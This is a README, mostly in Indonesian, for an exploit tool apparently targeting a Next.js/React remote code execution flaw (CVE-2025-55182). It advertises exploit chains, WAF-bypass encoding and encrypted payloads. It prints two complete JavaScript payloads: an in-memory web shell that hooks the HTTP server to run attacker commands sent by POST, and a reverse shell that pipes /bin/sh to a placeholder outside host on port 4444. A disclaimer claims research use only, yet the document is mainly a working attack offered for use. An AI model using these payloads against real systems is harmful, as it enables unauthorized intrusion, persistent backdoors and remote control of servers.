# SXTOOL - react2shell (Python) - CVE-2025-55182

> [!CAUTION]
> **Disclaimer / Peringatan**
>
> Tool ini hanya untuk **penelitian keamanan dan edukasi**. Pengguna harus memastikan memiliki **otorisasi legal** sebelum melakukan testing pada sistem target.
>
> Dilarang keras digunakan untuk penetration testing tanpa izin, serangan jahat, atau tujuan ilegal lainnya. Pengguna bertanggung jawab penuh atas risiko dan konsekuensi hukum yang timbul dari penggunaan tool ini.
>
> **Jika tidak menerima ketentuan ini, harap hentikan download atau penggunaan tool ini.**
>
> *Tool ini dikembangkan berdasarkan artikel publik, silakan audit kode sendiri sebelum menggunakan.*

---

## 🚀 Cara Menggunakan

### 1. Install Dependencies

```bash
pip install -r requirements.txt
```

### 2. Menjalankan Tool

```bash
python main.py
```

---

## ✨ Fitur

* **Dukungan Exploit Chain**:
    * `Prototype Chain`
    * `Array Map Chain`
* **WAF Bypass**:
    * ✅ **Unicode Encoding**
    * ✅ **UTF-16LE Encoding**
* **OpSec**:
    * 🔐 **AES Payload Encryption**
* **Toolbox**:
    * **Eksekusi Perintah**: Mendukung mode sinkron (execSync) dan async (exec)
    * **File Manager**: Interface seperti file explorer, support browsing, read, write
    * **Advanced Exploitation**: Support native JS code execution, module loading (`module._load`)

---

## 📋 Requirements

- Python 3.8+
- requests
- pycryptodome
- urllib3

---

## 🛠️ Struktur Proyek

```
Nextjs_RCE_Exploit_Python/
├── main.py                 # Entry point
├── core/
│   ├── __init__.py
│   ├── types.py           # Data types
│   └── exploit.py         # Core exploit logic
├── gui/
│   ├── __init__.py
│   └── window.py          # GUI implementation (tkinter)
├── utils/
│   ├── __init__.py
│   ├── crypto.py          # AES encryption
│   ├── encoding.py        # Unicode/UTF-16 encoding
│   └── security.py        # Security checks
└── requirements.txt
```

---

## 💉 Contoh Payload

Di tab "Eksploitasi Lanjutan -> Eksekusi JS Native", Anda dapat menggunakan payload berikut:

### 1. Memory Shell Injection
```javascript
(function(){
    try {
        if (global.memshell_active) return "Memshell already active!";
        var http = process.mainModule.require('http');
        var cp = process.mainModule.require('child_process');
        var qs = process.mainModule.require('querystring');
        var originalEmit = http.Server.prototype.emit;
        http.Server.prototype.emit = function(event, req, res) {
            if (event === 'request' && req && res) {
                var url = req.url || "";
                if (req.method === 'POST' && url.indexOf('/?pass') !== -1) {
                    var bodyArr = [];
                    req.on('data', function(chunk) {
                        bodyArr.push(chunk);
                    });
                    req.on('end', function() {
                        try {
                            var bodyStr = Buffer.concat(bodyArr).toString();
                            var postData = qs.parse(bodyStr);
                            var cmd = postData['pwd'];
                            if (cmd) {
                                var output = cp.execSync(cmd).toString();
                                res.writeHead(200, {'Content-Type': 'text/plain'});
                                res.end(output);
                            } else {
                                res.writeHead(400);
                                res.end("Parameter 'pwd' is missing.");
                            }
                        } catch (e) {
                            res.writeHead(500);
                            res.end("Error: " + e.message);
                        }
                    });
                    return true;
                }
            }
            return originalEmit.apply(this, arguments);
        };
        global.memshell_active = true;
        return "Memshell injected!";
    } catch (e) {
        return "Injection failed: " + e.message;
    }
})()
```

### 2. Reverse Shell
```javascript
(function(){
    try {
        var net = process.mainModule.require('net');
        var cp = process.mainModule.require('child_process');
        var sh = cp.spawn('/bin/sh', ['-i']);
        var client = new net.Socket();
        
        client.on('error', function(err) {
            if (sh) sh.kill(); 
        });
        sh.on('error', function(err) {
            if (client) client.destroy();
        });
        
        client.connect(4444, 'x.x.x.x', function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return "Spawned successfully (Async)";
    } catch (e) {
        return "Failed to spawn: " + e.message;
    }
})();
```

---

## 📝 Catatan

- Tool ini adalah port Python dari versi Go asli
- Semua teks UI sudah diterjemahkan ke Bahasa Indonesia
- GUI menggunakan tkinter (built-in Python, cross-platform)

---

## 🙏 Credits

Tool ini didasarkan pada penelitian komunitas keamanan. Kredit untuk:
- [@maple3142](https://x.com/maple3142/status/1996687157789155647)
- [@lachlan2k (React2Shell)](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)
- [@phithon (P牛)](https://x.com/phithon_xg/status/1997005756013728204)

